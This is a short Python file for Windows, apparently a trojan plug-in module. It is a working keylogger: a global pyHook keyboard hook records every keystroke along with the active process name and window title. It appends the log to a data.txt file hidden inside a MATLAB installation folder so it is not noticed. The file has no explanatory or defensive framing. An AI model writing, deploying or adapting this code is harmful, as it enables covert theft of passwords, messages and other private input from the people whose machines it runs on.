from ctypes import *
import pythoncom
import pyHook 
#import win32clipboard

def run(**args):
    user32   = windll.user32
    kernel32 = windll.kernel32
    psapi    = windll.psapi
    current_window = {}
    current_window[0]=None
    def get_current_process(current_window):
        hwnd = user32.GetForegroundWindow()
        pid = c_ulong(0)
        user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = "%d" % pid.value
        executable = create_string_buffer("\x00" * 512)
        h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
        psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
        window_title = create_string_buffer("\x00" * 512)
        length = user32.GetWindowTextA(hwnd, byref(window_title),512)
        with open(r'd:\\Program Files\\MATLAB\\R2016b\\bin\\win64\\data.txt','a') as fp:
            fp.write("\n")
            fp.write("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
        kernel32.CloseHandle(hwnd)
        kernel32.CloseHandle(h_process)        
    def KeyStroke(event): 
        if event.WindowName != current_window[0]:
            current_window[0] = event.WindowName        
            get_current_process(current_window[0])
        if event.Ascii > 32 and event.Ascii < 127:
            with open(r'd:\\Program Files\\MATLAB\\R2016b\\bin\\win64\\data.txt','a') as fp:
                fp.write(chr(event.Ascii))            
        else:
            with open(r'd:\\Program Files\\MATLAB\\R2016b\\bin\\win64\\data.txt','a') as fp:
                fp.write("[%s]" % event.Key)
    kl         = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    kl.HookKeyboard()
    pythoncom.PumpMessages()
